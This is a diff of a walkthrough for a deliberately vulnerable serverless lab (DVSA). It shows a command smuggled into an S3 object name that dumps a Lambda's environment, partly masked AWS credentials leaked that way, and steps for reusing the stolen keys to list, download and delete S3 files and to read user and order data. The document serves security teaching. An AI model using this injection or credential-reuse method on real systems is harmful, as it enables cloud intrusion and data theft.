@@ -12,16 +12,17 @@ aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;b=`env|base64 --wr
 
 It's not hard to find the relevant keys in the base64 string that we got:
 
-![alt base64-keys]()
+![alt base64-keys](https://i.imgur.com/ig8iV2J.png)
 
-Decoding them (```echo <BASE64> | base64 --decode```) will reveal:
+Decoding them (```echo <BASE64> | base64 --decode```) will reveal (partial info):
 ```
+AWS_LAMBDA_FUNCTION_VERSION=$LATEST
+AWS_SESSION_TOKEN=FQXXXXXXXXXXXXXXXPJnxYa8D85UCLwAXXXXXXXXXXXXXXXRUkQWDwu4NMqrE+dcRXXXXXXXXXXXXXXXrTB6PxZzyfw0pDFUJHXXXXXXXXXXXXXXXAFfF6kR5AjFSQd/SkjymXXXXXXXXXXXXXXXO+1JfHtJBFqwI7VnaHMcCoDp4O/WcXXXXXXXXXXXXXXXCNW886DrHxciDCXXXXXXXXXXXXXXXZt3k9f3WuwI/FfXXXXXXXXXXXXXXXp43gtQYe3IV1sCpPs/kUneXXXXXXXXXXXXXXXiZGU63V79bpu/Dt3fzO0eSHAO6ii4t9/gBQ==
 AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/DVSA-SEND-RECEIPT-EMAIL
 LAMBDA_TASK_ROOT=/var/task
 LD_LIBRARY_PATH=/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
 AWS_LAMBDA_LOG_STREAM_NAME=2018/12/23/[$LATEST]ce7961b403ba4b47806460db4bc62944
 AWS_EXECUTION_ENV=AWS_Lambda_python2.7
-AWS_XRAY_DAEMON_ADDRESS=169.254.79.2:2000
 AWS_LAMBDA_FUNCTION_NAME=DVSA-SEND-RECEIPT-EMAIL
 PATH=/usr/local/bin:/usr/bin/:/bin:/opt/bin
 SOURCE_EMAIL=tal+dvsa+noreply@protego.io
@@ -31,21 +32,44 @@ AWS_SECRET_ACCESS_KEY=xxxxxxxxxxxxxxxI8g7+XkMv/6tuC7xxxxxxxxxx
 LAMBDA_RUNTIME_DIR=/var/runtime
 LANG=en_US.UTF-8
 AWS_REGION=us-east-1
-TZ=:UTC
 ORDERS_TABLE=DVSA-ORDERS-DB
 AWS_ACCESS_KEY_ID=ASIAYXXXXXXXXXXXXXXX
-SHLVL=1
-_AWS_XRAY_DAEMON_ADDRESS=169.254.79.2
-_AWS_XRAY_DAEMON_PORT=2000
 PYTHONPATH=/var/runtime
-_X_AMZN_TRACE_ID=Root=1-5c20008f-d0654774095bf9f0cccb36e8;Parent=27d7de2b3f60098a;Sampled=0
-AWS_SECURITY_TOKEN=XXXXXXXXXXXXXXX//////////wEaDAz8TBS...gBQ==
-AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
 _HANDLER=lambda_function.lambda_handler
 AWS_LAMBDA_FUNCTION_MEMORY_SIZE=256
-_=/usr/bin/env
-
 ```
+Let's copy the relevant data into environment variables:
+```
+export AWS_SECRET_ACCESS_KEY = "..."
+export AWS_ACCESS_KEY_ID = "..."
+export AWS_SESSION_TOKEN = "..."
+```
+
+Or, into our AWS credentials - ~/.aws/credentials (which is my preferit):
+![alt stolen-keys](https://i.imgur.com/tFXFZEj.png)
+
+By default, temporary security credentials for an IAM user are valid for a maximum of 12 hours (and therefore, long gone in the screenshot). In this time frame, we can use these keys to run any AWS command that is aligned with the functions permissions. Since the function is (way) over-privileged, we can start stealing sensitive data and performing actions on the account.
+
+For example:
+
+(1) lisitng all files on s3:
+![alt ls-bucket](https://i.imgur.com/Cg8cBYs.png)
+
+(2) downloading a file from the bucket:
+![alt download-receipt](https://i.imgur.com/3hMxfZP.png)
+
+We can of course, also delete files. But, we are not limited to the S3! Let's explore further:
+
+(3) leaking all users:
+![alt leak-users](https://i.imgur.com/JVkreVB.png)
+
+(4) orders from dynamodb:
+![alt leak-orders](https://i.imgur.com/WdBSzVG.png)
+
+And many more. I'll leave that to you to explore.
+
+
+
 
 
 
